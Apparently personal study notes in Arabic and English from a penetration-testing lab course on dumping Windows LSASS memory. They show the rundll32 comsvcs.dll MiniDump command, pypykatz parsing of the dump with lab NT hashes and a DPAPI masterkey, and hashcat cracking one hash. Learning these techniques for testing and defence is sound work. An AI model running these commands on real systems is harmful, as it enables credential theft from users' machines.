- الLSASS زي ماذكرنا قبل كده هو مسؤول عن enforcing security policies و handling user auth و تخزين الcreds في الميموري
![](Pasted%20image%2020260207165125.png)

- بمجرد ما تسجل دخول الLSASS هيعمل caching للcreds دي بشكل local فالميموري وهيكريت access tokens وهيenforce security policies و هيبلغ الويندوز بالكلام ويتحك فالsecurity log
- هنتعلم انهارده بقي بعض التكنيكس والأدوات اللي هنستخدمها عشان نdump الLSASS memory ونستخرج منها الcreds
---
## Dumping LSASS process memory
- لو تفتكر فالSAM كنا بناخد كوبي من ملفات الhklm\sam وال hklm\system وكده عشان نقدر نعملهم dump ونستخرج الهاشات
- نفس الكلام هنا هناخد كوبي من الLSASS memory عن طريق اننا هنكريت dump file هيسمحلنا اننا نستخرج الcreds offline
#### Task Manager method
- افتح Task Manager
- روح لتابة Processes
- دور علي حاجه اسمها Local Security Authority Process ودوس عليها كليك يمين
- اختار Create dump file
![](Pasted%20image%2020260207165653.png)
الفايل اللي هيتكريت ده هيبقي اسمه `lsass.DMP` وبيكون متسيف في ال`%temp%`
وده الفايل اللي هننقله علي الجهاز بتاعنا كا هاكرز عشان نضمبه

---
#### Rundll32.exe & Comsvcs.dll method
- الطريقه بتاعت الtask manager دي بتنفع لو احنا واخدين GUI session طب لو احنا واخدين CLI session هنعمل ايه؟
- هنا بقي هنستخدم حاجه اسمها rundll32.exe وخلي بالك الطريقه دي اسرع من التاسك مانجر وflixible اكتر
- بما اننا بقي واخدين CLI session محتاجين نعرف الPID بتاع `lsass.exe`
#### Finding LSASS's PID in cmd

From cmd, we can issue the command `tasklist /svc` to find `lsass.exe` and its process ID.

```cmd-session
C:\Windows\system32> tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                        96 N/A
smss.exe                       344 N/A
csrss.exe                      432 N/A
wininit.exe                    508 N/A
csrss.exe                      520 N/A
winlogon.exe                   580 N/A
services.exe                   652 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 PlugPlay
svchost.exe                    804 BrokerInfrastructure, DcomLaunch, Power,
                                   SystemEventsBroker
fontdrvhost.exe                812 N/A
```
الlsass.exe هنا الpid بتاعها هو `672`
خلي بالك ممكن تجيب الPID من الpowwrshell برضو
#### Finding LSASS's PID in PowerShell

From PowerShell, we can issue the command `Get-Process lsass` and see the process ID in the `Id` field.

```powershell-session
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```

Once we have the PID assigned to the LSASS process, we can create a dump file
#### Creating a dump file using PowerShell

With an elevated PowerShell session, we can issue the following command to create a dump file:

```powershell-session
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
- الكوماند ده انا هنا رنيت ال`rundll32.exe` وعملت call للfunction اللي اسمها `comsvcs.dll` او ممكن نقول عليه `MiniDump`
- خلي بالك معظم الAV الحديث بيمنع العملية دي وفي طبعا طرق تخطي للAV
- طيب احنا دلوقتي عملنا الفايل lsass.dmp محتاجين ننقله علي الجهاز بتاعنا بقي وهنا ممكن نستخدم نفس الطريقه اللي استخدمناها في الSAM
---
## Using Pypykatz to extract credentials
- في الSAM استخدمنا `secretdump` عشان نستخرج الهاشات هنا بقي هنستعمل اداة اسمها `pypykatz` ودي بتستخرجلك الcreds من ملف `.dmp`
#### Running Pypykatz
- اول حاجه فالكوماند هنكتب اسم الاداة وبعد كده هنحدد `lsa` عشان `lsass` هو subsystem اصلا من ال`lsa` وطبعا هنقوله ان ده minidump file ونديله بقي الpath بتاع الملف بتاعنا
- 
```shell-session
0xTroj6n@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 

INFO:root:Parsing file /home/peter/Documents/lsass.dmp
FILE: ======== /home/peter/Documents/lsass.dmp =======
== LogonSession ==
authentication_id 1354633 (14ab89)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605

== LogonSession ==
authentication_id 1354581 (14ab55)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354581
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)

== LogonSession ==
authentication_id 1343859 (148173)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2021-12-14T18:14:25.248681+00:00
sid S-1-5-90-0-2
luid 1343859
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
```
#### MSV

```shell-session
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
```
- الMSV ده authentication package في الwindows الLSA بتستدعيها عشان تvalidate علي عمليات الlogin علي الSAM db
- زي ما احنا شايفين الpypykatz استخرجتلنا ال`SID, Username, Domain, NT & SHA1 Password`
#### WDIGEST

```shell-session
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
```
- الWDIGEST ده نظام تأمين قديم كان شغال تلقائي في ويندوز لحد Win 8 والLSASS هنا كانت بتسجل الباسوردات كا plaintext
#### Kerberos

```shell-session
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
```
- الKerbros ده network auth protocol بيستخدم عن طريق الAD وخصوصا في الDomain ENVs وده بيديك ticket اول ما بتسجل دخول علي جهازك وتقدر تشير حاجات علي النيتورك بناءا علي الticket دي ومن غير مايتطلب منك تدخل الباسورد كل شوية الLSASS هنا بقي بيكيش الpasswords والekeys والtickets الخاصين بالKerberos
#### DPAPI

```shell-session
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```
#### Cracking the NT Hash with Hashcat

```shell-session
0xTroj6n@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```
---
